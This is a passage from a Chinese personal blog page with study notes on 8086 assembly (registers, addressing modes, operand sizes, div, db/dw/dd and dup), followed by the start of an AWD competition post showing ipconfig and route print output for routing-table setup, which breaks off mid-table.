          <h2 id="reg-sreg"><a href="#reg-sreg" class="headerlink" title="reg/sreg"></a>reg/sreg</h2><h4 id="reg-寄存器"><a href="#reg-寄存器" class="headerlink" title="reg:寄存器"></a>reg:寄存器</h4><p>reg的集合包括:ax,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di</p>
<h4 id="sreg：段寄存器"><a href="#sreg：段寄存器" class="headerlink" title="sreg：段寄存器"></a>sreg：段寄存器</h4><p>sreg的集合包括:ds,ss,cs,es</p>
<h2 id="bx-si-di-bp"><a href="#bx-si-di-bp" class="headerlink" title="bx,si,di,bp"></a>bx,si,di,bp</h2><ul>
<li>在8086CPU中，只有这4个寄存器（bx,bp,si,di）可以用在<code>[…]</code>中来进行内存单元的寻址<ul>
<li>正确的指令形式:<code>mov ax,[bx]</code> <code>mov ax,[bx+si]</code></li>
<li>错误的指令形式:<code>mov ax,[cx]</code> <code>mov ax,[ax]</code></li>
</ul>
</li>
<li>在<code>[…]</code>中这4个寄存器可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di<ul>
<li>错误的用法：<code>mov ax,[bx+bp]</code>  <code>mov ax,[si+di]</code></li>
</ul>
</li>
<li>只要在<code>[…]</code>中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中</li>
</ul>
<h2 id="数据的位置"><a href="#数据的位置" class="headerlink" title="数据的位置"></a>数据的位置</h2><p>汇编语言用三个概念来表示数据的位置</p>
<ul>
<li>立即数（idata）<ul>
<li>对于直接包含在机器指令中的数据（执行前在CPU的指令缓冲器中），例如<code>mov ax.1</code>中的1即为立即数</li>
</ul>
</li>
<li>寄存器</li>
<li>段地址（SA）和偏移地址（EA）<ul>
<li>存放段地址的寄存器可以是默认的<ul>
<li>默认在ds中的场景<ul>
<li>mov ax,[0]</li>
<li>mov ax,[bx]</li>
<li>mov ax,[bx+8]</li>
<li>mov ax,[bx+si]</li>
<li>mov ax,[bx+si+8]</li>
</ul>
</li>
<li>默认在ss中的场景<ul>
<li>mov ax,[bp]</li>
<li>mov ax,[bp+8]</li>
<li>mov ax,[bp+si]</li>
<li>mov ax,[bp+si+8]</li>
</ul>
</li>
</ul>
</li>
<li>存放段地址的寄存器也可以显性的给出<ul>
<li>mov ax,ds:[bp]</li>
<li>mov ax,es:[bx]</li>
<li>mov ax,ss:[bx+si]</li>
<li>mov ax,cs:[bx+si+8]</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="数据的长度"><a href="#数据的长度" class="headerlink" title="数据的长度"></a>数据的长度</h2><p>8086CPU的指令可以处理两种尺寸的数据，字节（byte）和字（word），所以在机器指令中要指明，指令进行的是字操作还是字节操作，在32位处理器中还引入了双字（double word），在64位处理器还引入了四字</p>
<ul>
<li>通过寄存器名指明要处理的数据的尺寸<ul>
<li>指明了是字（word）操作<ul>
<li>mov ax,1</li>
<li>mov bx,ds:[0]</li>
<li>mov ds,ax</li>
<li>mov ds:[0],ax</li>
<li>inc ax</li>
<li>add ax,1000</li>
</ul>
</li>
<li>指明了是字节（byte）操作<ul>
<li>mov al,1</li>
<li>mov al,bl</li>
<li>mov al,ds:[0]</li>
<li>mov ds:[0],al</li>
<li>inc al</li>
<li>add al,100</li>
</ul>
</li>
</ul>
</li>
<li>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在8086汇编指令中可以为word或byte<ul>
<li>用word ptr指明访问字（word）单元<ul>
<li>mov word ptr ds:[0],1</li>
<li>inc word ptr [bx]</li>
<li>inc word ptr ds:[0]</li>
<li>add word ptr [bx],2</li>
</ul>
</li>
<li>用byte ptr指明访问字节（byte）单元</li>
</ul>
</li>
<li>其他方法<ul>
<li>有些指令默认了访问的是字节（byte）或字（word）<ul>
<li>push指令只进行字（word）操作：<code>push [1000H]</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="结构化访问数据"><a href="#结构化访问数据" class="headerlink" title="结构化访问数据"></a>结构化访问数据</h2><p>一般来说我们可以用[bx+idata+si]的方式来进行访问结构体中的数据</p>
<ul>
<li>用bx定位整个结构体</li>
<li>用idata定位结构体中的某一个数据项</li>
<li>用si定位数组项中的每个元素</li>
</ul>
<p>所以也可以使用更方便的写法，例如：<code>[bx].idata</code>  <code>[bx].idata[si]</code></p>
<h2 id="div"><a href="#div" class="headerlink" title="div"></a>div</h2><p>div是除法指令（division），使用div作除法的时候</p>
<ul>
<li>除数：8位或16位，在寄存器或内存单元中</li>
<li>被除数：（默认）放在AX或DX和AX中</li>
</ul>
<table>
<thead>
<tr>
<th align="center">除数</th>
<th align="center">被除数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8位</td>
<td align="center">16位（AX）</td>
</tr>
<tr>
<td align="center">16位</td>
<td align="center">32位（DX+AX）</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">运算</th>
<th align="center">8位</th>
<th align="center">16位</th>
</tr>
</thead>
<tbody><tr>
<td align="center">商</td>
<td align="center">AL</td>
<td align="center">AX</td>
</tr>
<tr>
<td align="center">余数</td>
<td align="center">AH</td>
<td align="center">DX</td>
</tr>
</tbody></table>
<p>div指令格式：</p>
<ul>
<li>div reg</li>
<li>div 内存单元<ul>
<li>div byte ptr ds:[0]</li>
<li>div word ptr es:[0]</li>
</ul>
</li>
</ul>
<h2 id="db、dw、dd"><a href="#db、dw、dd" class="headerlink" title="db、dw、dd"></a>db、dw、dd</h2><h4 id="db"><a href="#db" class="headerlink" title="db"></a><strong>db</strong></h4><p>db在汇编中表示一个byte，就是一个字节8位，每次读取数据时，读完一个偏移量加1 </p>
<h4 id="dw"><a href="#dw" class="headerlink" title="dw"></a><strong>dw</strong></h4><p>dw在汇编中表示一个字（word），就是两个字节16位，每次读取数据时，读完一个偏移量加2</p>
<p><strong>dd</strong></p>
<p>dd在汇编中表示一个双字，就是四个字节32位，每次读取数据时，读完一个偏移量加4</p>
<h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><p>dup和db、dw、dd等数据定义伪指令配合使用的，来进行数据的重复</p>
<ul>
<li>db 重复的次数 dup (重复的字节型数据)</li>
<li>dw 重复的次数 dup (重复的字型数据)</li>
<li>dd 重复的次数 dup (重复的双字型数据)</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ul>
<li>db 3 dup(0)<ul>
<li>定义了3个字节，他们的值都是0，相当于db 0,0,0</li>
</ul>
</li>
<li>db 3 dup(0,1,2)<ul>
<li>定义了9个字节，他们的值是(0,1,2,0,1,2,0,1,2)，相当于db 0,1,2,0,1,2,0,1,2</li>
</ul>
</li>
<li>db 3 dup(‘abc’,’ABC’)<ul>
<li>定义了18个字节，他们的值是(‘abcABCabcABCabcABC’)，相当于db ‘abcABCabcABCabcABC’</li>
</ul>
</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/8086─┌┤µ╤░╓╖╖╜╩╜╨í╜ß/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/02/8086─┌┤µ╤░╓╖╖╜╩╜╨í╜ß/" class="post-title-link" itemprop="url">8086内存寻址方式小结</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-02 22:42:36" itemprop="dateCreated datePublished" datetime="2020-02-02T22:42:36-08:00">2020-02-02</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-04 16:13:06" itemprop="dateModified" datetime="2020-02-04T16:13:06-08:00">2020-02-04</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>8086内存寻址的段地址寄存器默认为ds，主要有以下几种方式</p>
<ol>
<li><code>[idata]</code>用一个常量来表示地址，可用于直接定位一个内存单元，例如<code>mov ax,[2]</code>，结果就是<code>(ax)=(ds)*16+idata</code></li>
<li><code>[bx]</code>用一个变量来表示内存地址，可用于间接定位一个内存单元，例如<code>mov ax,[bx]</code>，结果就是<code>(ax)=(ds)*16+bx</code></li>
<li><code>[bx+idata]</code>用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元，例如<code>mov ax,[bx+8]</code>或者<code>mov ax,8[bx]</code>，结果就是<code>（ax)=(ds)*16+(bx)+idata</code></li>
<li><code>[bx+si]</code>用两个变量表示地址，例如<code>mov ax,[bx+si+8]</code>或者<code>mov ax,8[bx+si]</code>，结果就是<code>（ax)=(ds)*16+(bx)+(si)+idata</code></li>
</ol>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(157).png" alt></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/30/AWD╧▀╧┬╚ⁿ▒╩╝╟/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/30/AWD╧▀╧┬╚ⁿ▒╩╝╟/" class="post-title-link" itemprop="url">AWD线下赛笔记</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-12-30 18:45:08" itemprop="dateCreated datePublished" datetime="2019-12-30T18:45:08-08:00">2019-12-30</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2019-12-31 10:45:24" itemprop="dateModified" datetime="2019-12-31T10:45:24-08:00">2019-12-31</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表"></a>配置路由表</h2><p>首先调用<code>ipconfig</code>查看本机网络状况</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\syc&gt; ipconfig</span><br><span class="line">Windows IP 配置</span><br><span class="line">以太网适配器 vEthernet (Default <span class="keyword">Switch</span>):</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">861</span>:<span class="number">2</span>a51:<span class="number">6</span>e5a:<span class="number">761</span>b%<span class="number">9</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">172.17</span>.<span class="number">126.97</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.240</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 以太网:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">716</span>b:<span class="number">1</span>e8e:e67a:bdf%<span class="number">20</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">10.0</span>.<span class="number">10.2</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 以太网 <span class="number">2</span>:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">以太网适配器 VirtualBox Host-Only Network:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">40</span>de:<span class="number">409</span>b:e37f:<span class="number">34</span>eb%<span class="number">4</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 VirtualBox Host-Only Network <span class="comment">#2:</span></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::cd1f:a63d:<span class="number">6</span>cee:c094%<span class="number">17</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">201.2</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">无线局域网适配器 本地连接* <span class="number">1</span>:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">无线局域网适配器 本地连接* <span class="number">3</span>:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">以太网适配器 VMware Network Adapter VMnet1:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">9401</span>:d238:<span class="number">7</span>f61:d7d3%<span class="number">7</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">61.1</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">以太网适配器 VMware Network Adapter VMnet8:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">907</span>b:<span class="number">8932</span>:<span class="number">6</span>a09:c20b%<span class="number">10</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">159.1</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . :</span><br><span class="line">无线局域网适配器 WLAN:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class="line">   IPv6 地址 . . . . . . . . . . . . : <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span></span><br><span class="line">   临时 IPv6 地址. . . . . . . . . . : <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">6513</span>:<span class="number">5</span>ca8:<span class="number">8</span>df0:e7f</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span>%<span class="number">16</span></span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">192.168</span>.<span class="number">43.65</span></span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : fe80::<span class="number">90</span>f0:<span class="number">52</span>ff:fe0e:<span class="number">4</span>b86%<span class="number">16</span></span><br><span class="line">以太网适配器 蓝牙网络连接:</span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure>

<p>然后调用<code>route print</code>查看本机路由表情况</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\syc&gt; route print</span><br><span class="line">===========================================================================</span><br><span class="line">接口列表</span><br><span class="line">  <span class="number">9</span>...<span class="number">00</span> <span class="number">15</span> <span class="number">5</span>d bf b4 b8 ......Hyper-V Virtual Ethernet Adapter</span><br><span class="line"> <span class="number">20</span>...<span class="number">80</span> e8 <span class="number">2</span>c <span class="number">1</span>a <span class="number">31</span> <span class="number">4</span>d ......Realtek PCIe GbE Family Controller</span><br><span class="line"> <span class="number">21</span>...<span class="number">08</span> <span class="number">00</span> <span class="number">58</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span> ......SSL VPN Client Virtual Network Adapter</span><br><span class="line">  <span class="number">4</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> ......VirtualBox Host-Only Ethernet Adapter</span><br><span class="line"> <span class="number">17</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">11</span> ......VirtualBox Host-Only Ethernet Adapter <span class="comment">#2</span></span><br><span class="line"> <span class="number">25</span>...f2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter</span><br><span class="line"> <span class="number">15</span>...b2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter <span class="comment">#3</span></span><br><span class="line">  <span class="number">7</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">01</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line"> <span class="number">10</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">08</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line"> <span class="number">16</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Realtek RTL8822BE <span class="number">802.11</span>ac PCIe Adapter</span><br><span class="line"> <span class="number">11</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b a0 ......Bluetooth Device (Personal Area Network)</span><br><span class="line">  <span class="number">1</span>...........................Software Loopback Interface <span class="number">1</span></span><br><span class="line"> <span class="number">19</span>...<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> e0 Microsoft Teredo Tunneling Adapter</span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">IPv4 路由表</span><br><span class="line">===========================================================================</span><br><span class="line">活动路由:</span><br><span class="line">网络目标        网络掩码          网关       接口   跃点数</span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>     <span class="number">192.168</span>.<span class="number">43.1</span>    <span class="number">192.168</span>.<span class="number">43.65</span>     <span class="number">35</span></span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>      <span class="number">10.0</span>.<span class="number">10.254</span>        <span class="number">10.0</span>.<span class="number">10.2</span>     <span class="number">25</span></span><br><span class="line">        <span class="number">10.0</span>.<span class="number">10.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">10.0</span>.<span class="number">10.2</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">      <span class="number">10.0</span>.<span class="number">10.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">127.0</span>.<span class="number">0.0</span>        <span class="number">255.0</span>.<span class="number">0.0</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">        <span class="number">127.0</span>.<span class="number">0.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">  <span class="number">127.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">    <span class="number">172.17</span>.<span class="number">126.96</span>  <span class="number">255.255</span>.<span class="number">255.240</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">    <span class="number">172.17</span>.<span class="number">126.97</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">   <span class="number">172.17</span>.<span class="number">126.111</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">43.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">43.65</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">   <span class="number">192.168</span>.<span class="number">43.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">56.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">56.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">   <span class="number">192.168</span>.<span class="number">56.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">61.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">61.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">   <span class="number">192.168</span>.<span class="number">61.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">159.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">159.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">192.168</span>.<span class="number">159.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">201.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">201.2</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">192.168</span>.<span class="number">201.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">        <span 